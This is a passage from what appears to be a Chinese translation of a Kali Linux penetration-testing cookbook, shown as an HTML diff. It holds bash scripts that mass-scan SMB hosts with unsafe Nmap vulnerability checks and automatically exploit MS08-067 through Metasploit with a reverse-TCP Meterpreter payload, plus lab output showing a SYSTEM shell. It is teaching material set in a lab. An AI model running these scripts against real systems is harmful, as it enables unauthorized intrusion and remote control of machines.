&#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x5C06;&#x591A;&#x4E2A;&#x4EFB;&#x52A1;&#x4E32;&#x8054;&#x5728;&#x4E00;&#x8D77;&#x3002; &#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6267;&#x884C; Nmap grepable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x8BE5;&#x4EFB;&#x52A1;&#x6807;&#x8BC6;&#x7684;&#x4FE1;&#x606F;&#x7528;&#x4E8E;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#x6267;&#x884C; Nmap NSE &#x811A;&#x672C;&#x3002; &#x5177;&#x4F53;&#x6765;&#x8BF4;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x5C06;&#x786E;&#x5B9A;&#x54EA;&#x4E9B;&#x7CFB;&#x7EDF;&#x5728; TCP 445 &#x4E0A;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x9488;&#x5BF9;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x6267;&#x884C;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#x3002;</p>
+<pre><code>#! /bin/bash
+
+if [ ! $1 ]; then echo &quot;Usage: #./script &lt;file&gt;&quot;; exit; fi
+
+file=$1
+
+for x in $(grep open $file | grep 445 | cut -d &quot; &quot; -f 2); 
+    do nmap --script smb-check-vulns.nse -p 445 $x --scriptargs=unsafe=1; 
+done
+</code></pre><p>&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x4F60;&#x80FD;&#x7406;&#x89E3;&#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x6309;&#x987A;&#x5E8F;&#x8BB2;&#x89E3;&#x6BCF;&#x4E00;&#x884C;&#x3002; &#x524D;&#x51E0;&#x884C;&#x4E0E;&#x4E0A;&#x4E00;&#x4E2A;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x811A;&#x672C;&#x7C7B;&#x4F3C;&#x3002; &#x7B2C;&#x4E00;&#x884C;&#x6307;&#x5411; bash &#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x7B2C;&#x4E8C;&#x884C;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x63D0;&#x4F9B;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E09;&#x884C;&#x5C06;&#x8F93;&#x5165;&#x503C;&#x8D4B;&#x7ED9;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x7684;&#x53D8;&#x91CF;&#x540D;&#x3002; &#x811A;&#x672C;&#x7684;&#x6B63;&#x6587;&#x6709;&#x4E00;&#x5B9A;&#x533A;&#x5206;&#x3002; <code>for</code>&#x5FAA;&#x73AF;&#x7528;&#x4E8E;&#x904D;&#x5386;&#x901A;&#x8FC7;<code>grep</code>&#x51FD;&#x6570;&#x83B7;&#x53D6;&#x7684; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x3002; &#x4ECE;<code>grep</code>&#x51FD;&#x6570;&#x8F93;&#x51FA;&#x7684; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x5BF9;&#x5E94;&#x5728; TCP &#x7AEF;&#x53E3; 445 &#x4E0A;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x7684;&#x6240;&#x6709;&#x7CFB;&#x7EDF;&#x3002;&#x7136;&#x540E;&#x5BF9;&#x8FD9;&#x4E9B; IP &#x5730;&#x5740;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x6267;&#x884C; Nmap NSE &#x811A;&#x672C;&#x3002; &#x901A;&#x8FC7;&#x4EC5;&#x5728;&#x5148;&#x524D;&#x5DF2;&#x6807;&#x8BC6;&#x4E3A;&#x5728; TCP 445 &#x4E0A;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#x8FD0;&#x884C;&#x6B64;&#x811A;&#x672C;&#xFF0C;&#x6267;&#x884C; NSE &#x626B;&#x63CF;&#x6240;&#x9700;&#x7684;&#x65F6;&#x95F4;&#x5927;&#x5927;&#x51CF;&#x5C11;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./smb_eval.sh 
+Usage: #./script &lt;file&gt;
+</code></pre><p>&#x901A;&#x8FC7;&#x6267;&#x884C;&#x4E0D;&#x5E26;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x7528;&#x6CD5;&#x63CF;&#x8FF0;&#x3002; &#x8BE5;&#x63CF;&#x8FF0;&#x8868;&#x660E;&#xFF0C;&#x5E94;&#x5F53;&#x63D0;&#x4F9B;&#x73B0;&#x6709; Nmap grepable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x5F53;&#x63D0;&#x4F9B; Nmap &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x811A;&#x672C;&#x5FEB;&#x901F;&#x5206;&#x6790;&#x6587;&#x4EF6;&#x6765;&#x67E5;&#x627E;&#x5177;&#x6709; TCP 445 &#x670D;&#x52A1;&#x7684;&#x4EFB;&#x4F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x8FD0;&#x884C; NSE &#x811A;&#x672C;&#xFF0C;&#x5E76;&#x5C06;&#x7ED3;&#x679C;&#x8F93;&#x51FA;&#x5230;&#x7EC8;&#x7AEF;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./smb_eval.sh netscan.txt
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:45 EDT 
+Nmap scan report for 172.16.36.135 
+Host is up (0.00035s latency). 
+PORT    STATE SERVICE 
+445/tcp open  microsoft-ds 
+MAC Address: 00:0C:29:3D:84:32 (VMware)
+
+Host script results: 
+| smb-check-vulns: 
+|   Conficker: UNKNOWN; not Windows, or Windows with disabled browser service (CLEAN); or Windows with crashed browser service (possibly INFECTED). 
+|   
+|  If you know the remote system is Windows, try rebooting it and scanning 
+|   
+|_ again. (Error NT_STATUS_OBJECT_NAME_NOT_FOUND) 
+|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
+
+|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
+|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.21 seconds
+
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:45 EDT 
+Nmap scan report for 172.16.36.225 
+Host is up (0.00041s latency). 
+PORT    STATE SERVICE 
+445/tcp open  microsoft-ds 
+MAC Address: 00:0C:29:18:11:FB (VMware)
+
+Host script results: 
+| smb-check-vulns: 
+|   MS08-067: VULNERABLE 
+|   Conficker: Likely CLEAN 
+|   regsvc DoS: NOT VULNERABLE 
+|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
+|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
+|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.18 seconds
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x811A;&#x672C;&#x4F1A;&#x4F20;&#x9012;&#x5230;<code>netscan.txt</code>&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002; &#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x5FEB;&#x901F;&#x5206;&#x6790;&#x540E;&#xFF0C;&#x811A;&#x672C;&#x786E;&#x5B9A;&#x4E24;&#x4E2A;&#x7CFB;&#x7EDF;&#x6B63;&#x5728;&#x7AEF;&#x53E3;445&#x4E0A;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x3002;&#x7136;&#x540E;&#x4F7F;&#x7528;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#x626B;&#x63CF;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x5728;&#x7EC8;&#x7AEF;&#x4E2D;&#x751F;&#x6210;&#x8F93;&#x51FA;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x901A;&#x8FC7;&#x63D0;&#x4F9B;<code>grep</code>&#x5E8F;&#x5217;&#x4F5C;&#x4E3A;<code>for</code>&#x5FAA;&#x73AF;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x503C;&#xFF0C;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x7684; bash &#x811A;&#x672C;&#x57FA;&#x672C;&#x4E0A;&#x53EA;&#x662F;&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x8F93;&#x51FA;&#x3002; &#x901A;&#x8FC7;&#x72EC;&#x7ACB;&#x8FD0;&#x884C;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5B83;&#x53EA;&#x63D0;&#x53D6;&#x5BF9;&#x5E94;&#x8FD0;&#x884C; SMB &#x670D;&#x52A1;&#x7684;&#x4E3B;&#x673A;&#x7684; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x3002; &#x7136;&#x540E;&#xFF0C;<code>for</code>&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x8FD9;&#x4E9B;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x5BF9;&#x6BCF;&#x4E2A; IP &#x5730;&#x5740;&#x6267;&#x884C; NSE &#x811A;&#x672C;&#x3002;</p>
+<h2 id="83-&#x4F7F;&#x7528;-msf-&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;-nmap-mse-&#x6F0F;&#x6D1E;&#x626B;&#x63CF;">8.3 &#x4F7F;&#x7528; MSF &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684; Nmap MSE &#x6F0F;&#x6D1E;&#x626B;&#x63CF;</h2>
+<p>&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F00;&#x53D1;&#x4E00;&#x4E2A;&#x5C06;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x4E0E;&#x5229;&#x7528;&#x76F8;&#x7ED3;&#x5408;&#x7684;&#x811A;&#x672C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x6240;&#x5E2E;&#x52A9;&#x3002; &#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x901A;&#x5E38;&#x4F1A;&#x5BFC;&#x81F4;&#x8BEF;&#x62A5;&#xFF0C;&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x7684;&#x540E;&#x7EED;&#x5229;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x9A8C;&#x8BC1;&#x8FD9;&#x4E9B;&#x53D1;&#x73B0;&#x7684;&#x6B63;&#x786E;&#x6027;&#x3002; &#x6B64;&#x79D8;&#x7C4D;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x6765;&#x6267;&#x884C;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#xFF0C;&#x6765;&#x786E;&#x5B9A;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x5B58;&#x5728; MS08-067 NetAPI &#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x4E14;&#x5982;&#x679C; NSE &#x811A;&#x672C;&#x663E;&#x793A;&#x5982;&#x6B64;&#xFF0C;Metasploit &#x4F1A;&#x7528;&#x4E8E; &#x81EA;&#x52A8;&#x5C1D;&#x8BD5;&#x5229;&#x7528;&#x5B83;&#x6765;&#x9A8C;&#x8BC1;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x672C;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x4F7F;&#x7528; grepable &#x683C;&#x5F0F;&#x7684; Nmap &#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6267;&#x884C; Nmap &#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5E76;&#x4F7F;&#x7528;<code>-oA</code>&#x9009;&#x9879;&#x8F93;&#x51FA;&#x6240;&#x6709;&#x683C;&#x5F0F;&#xFF0C;&#x6216;<code>-oG</code>&#x6765;&#x4E13;&#x95E8;&#x8F93;&#x51FA; greppable &#x683C;&#x5F0F;&#x6765;&#x83B7;&#x53D6;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x5728;&#x5355;&#x4E2A;<code>/24</code>&#x5B50;&#x7F51;&#x4E0A;&#x626B;&#x63CF;&#xFF0C;&#x8FD9;&#x5305;&#x62EC; Windows XP &#x548C; Metasploitable2&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x5C06;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x548C;&#x76EE;&#x6807;&#x5229;&#x7528;&#x7684;&#x4EFB;&#x52A1;&#x4E32;&#x8054;&#x5230;&#x4E00;&#x8D77;&#x3002; &#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;<code>smb-checkvulns.nse</code>&#x811A;&#x672C;&#x7528;&#x4E8E;&#x786E;&#x5B9A;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5BB9;&#x6613;&#x53D7;&#x5230; MS08-067 &#x653B;&#x51FB;&#xFF0C;&#x7136;&#x540E;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x5219;&#x5BF9;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x76F8;&#x5E94;&#x7684; Metasploit &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x3002;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#! /bin/bash
+</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;RHOST&gt; &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+rhost=<span class="hljs-variable">$1</span> 
+lhost=<span class="hljs-variable">$2</span> 
+lport=<span class="hljs-variable">$3</span>
+
+nmap --script smb-check-vulns.nse -p 445 <span class="hljs-variable">$rhost</span> --scriptargs=unsafe=1 -oN tmp_output.txt 
+<span class="hljs-keyword">if</span> [ $(grep MS08-067 tmp_output.txt | cut <span class="hljs-_">-d</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-_">-f</span> 5) = <span class="hljs-string">&quot;VULNERABLE&quot;</span> ];
+    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$rhost</span> appears to be vulnerable, exploiting with Metasploit...&quot;</span>;   
+    msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/ meterpreter/reverse_tcp RHOST=<span class="hljs-variable">$rhost</span> LHOST=<span class="hljs-variable">$lhost</span> LPORT=<span class="hljs-variable">$lport</span> E; 
+<span class="hljs-keyword">fi</span> 
+rm tmp_output.txt
+</code></pre>
+<p>&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x4F60;&#x80FD;&#x7406;&#x89E3;&#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x6309;&#x987A;&#x5E8F;&#x5BF9;&#x6BCF;&#x4E00;&#x884C;&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#x3002;&#x811A;&#x672C;&#x4E2D;&#x7684;&#x524D;&#x51E0;&#x884C;&#x4E0E;&#x672C;&#x7AE0;&#x524D;&#x9762;&#x8BA8;&#x8BBA;&#x7684;&#x811A;&#x672C;&#x76F8;&#x540C;&#x3002;&#x7B2C;&#x4E00;&#x884C;&#x5B9A;&#x4E49;&#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x7B2C;&#x4E8C;&#x884C;&#x6D4B;&#x8BD5;&#x8F93;&#x5165;&#xFF0C;&#x7B2C;&#x4E09;&#xFF0C;&#x7B2C;&#x56DB;&#x548C;&#x7B2C;&#x4E94;&#x884C;&#x90FD;&#x7528;&#x4E8E;&#x6839;&#x636E;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;&#x3002;&#x5728;&#x6B64;&#x811A;&#x672C;&#x4E2D;&#xFF0C;&#x63D0;&#x4F9B;&#x7684;&#x7528;&#x6237;&#x53D8;&#x91CF;&#x5BF9;&#x5E94; Metasploit &#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x53D8;&#x91CF;&#x3002; <code>RHOST</code>&#x53D8;&#x91CF;&#x5E94;&#x8BE5;&#x5B9A;&#x4E49;&#x76EE;&#x6807;&#x7684; IP &#x5730;&#x5740;&#xFF0C;<code>LHOST</code>&#x53D8;&#x91CF;&#x5E94;&#x8BE5;&#x5B9A;&#x4E49;&#x53CD;&#x5411;&#x76D1;&#x542C;&#x5668;&#x7684; IP &#x5730;&#x5740;&#xFF0C;<code>LPORT</code>&#x53D8;&#x91CF;&#x5E94;&#x8BE5;&#x5B9A;&#x4E49;&#x6B63;&#x5728;&#x76D1;&#x542C;&#x7684;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x3002;&#x7136;&#x540E;&#x811A;&#x672C;&#x5728;&#x6B63;&#x6587;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x662F;&#xFF0C;&#x5BF9;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684; IP &#x5730;&#x5740;&#x6267;&#x884C;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#xFF0C;&#x5B83;&#x7531;<code>RHOST</code>&#x8F93;&#x5165;&#x5B9A;&#x4E49;&#x3002;&#x7136;&#x540E;&#xFF0C;&#x7ED3;&#x679C;&#x4EE5;&#x6B63;&#x5E38;&#x683C;&#x5F0F;&#x8F93;&#x51FA;&#x5230;&#x4E34;&#x65F6;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x3002;&#x7136;&#x540E;&#xFF0C;<code>if ... then</code>&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x4E0E;<code>grep</code>&#x51FD;&#x6570;&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x552F;&#x4E00;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5B83;&#x8868;&#x660E;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x3002;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x4E86;&#x552F;&#x4E00;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5219;&#x811A;&#x672C;&#x4F1A;&#x663E;&#x5F0F;&#x7CFB;&#x7EDF;&#x770B;&#x8D77;&#x6765;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; Metasploit &#x6846;&#x67B6;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF08;MSFCLI&#xFF09;&#x4F7F;&#x7528; Meterpreter &#x8F7D;&#x8377;&#x6267;&#x884C; Metasploit &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x5728;&#x52A0;&#x8F7D;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x540E;&#xFF0C;&#x4F7F;&#x7528;<code>rm</code>&#x51FD;&#x6570;&#x4ECE;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x5220;&#x9664; Nmap &#x4E34;&#x65F6;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002;<code>test_n_xploit.sh bash</code>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./test_n_xploit.sh 
+Usage: #./script &lt;RHOST&gt; &lt;LHOST&gt; &lt;LPORT&gt;
+</code></pre><p>&#x5982;&#x679C;&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x6B64;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x663E;&#x793A;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x5E94;&#x4EE5;&#x53C2;&#x6570;<code>RHOST</code>&#xFF0C;<code>LHOST</code>&#x548C;<code>LPORT</code>&#x6267;&#x884C;&#x3002; &#x8FD9;&#x4E9B;&#x8F93;&#x5165;&#x503C;&#x5C06;&#x7528;&#x4E8E; Nmap NSE &#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x548C;&#xFF08;&#x5982;&#x679C;&#x6709;&#x4FDD;&#x8BC1;&#xFF09;&#x4F7F;&#x7528; Metasploit &#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x6267;&#x884C;&#x5229;&#x7528;&#x3002; &#x5728;&#x4EE5;&#x4E0B;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x811A;&#x672C;&#x7528;&#x4E8E;&#x786E;&#x5B9A; IP &#x5730;&#x5740;&#x4E3A;<code>172.16.36.225</code>&#x7684;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x3002; &#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x88AB;&#x786E;&#x5B9A;&#x4E3A;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x5219;&#x4F1A;&#x6267;&#x884C;&#x5229;&#x7528;&#xFF0C;&#x5E76;&#x8FDE;&#x63A5;&#x5230;&#x53CD;&#x5411; TCP Meterpreter &#x5904;&#x7406;&#x5668;&#xFF0C;&#x8BE5;&#x5904;&#x7406;&#x5176;&#x5728; IP &#x5730;&#x5740;<code>172.16.36.239</code>&#x7684; TCP &#x7AEF;&#x53E3; 4444 &#x4E0A;&#x76D1;&#x542C;&#x7CFB;&#x7EDF;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./test_n_xploit.sh 172.16.36.225 172.16.36.239 4444
+
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:58 EDT 
+Nmap scan report for 172.16.36.225 
+Host is up (0.00077s latency). 
+PORT    STATE SERVICE 
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:18:11:FB (VMware)
+
+Host script results: 
+| smb-check-vulns: 
+|   MS08-067: VULNERABLE 
+|   Conficker: Likely CLEAN 
+|   regsvc DoS: NOT VULNERABLE 
+|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
+|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
+|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds 172.16.36.225 appears to be vulnerable, exploiting with Metasploit... 
+[*] Please wait while we load the module tree...
+     ,           ,    
+    /             \  
+   ((__---,,,---__))   
+      (_) O O (_)_________    
+         \ _ /            |\    
+          o_o \   M S F   | \  
+               \   _____  |  *    
+                |||   WW|||      
+                |||     |||
+
+Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with Metasploit Pro -- type &apos;go_pro&apos; to launch it now.
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
++ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp 
+RHOST =&gt; 172.16.36.225 
+LHOST =&gt; 172.16.36.239 
+LPORT =&gt; 4444
+
+[*] Started reverse handler on 172.16.36.239:4444 
+[*] Automatically detecting the target... 
+[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
+[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
+[*] Attempting to trigger the vulnerability... 
+[*] Sending stage (752128 bytes) to 172.16.36.225 
+[*] Meterpreter session 1 opened (172.16.36.239:4444 -&gt; 172.16.36.225:1130) at 2014-04-10 05:58:30 -0400
+
+meterpreter &gt; getuid 
+Server username: NT AUTHORITY\SYSTEM
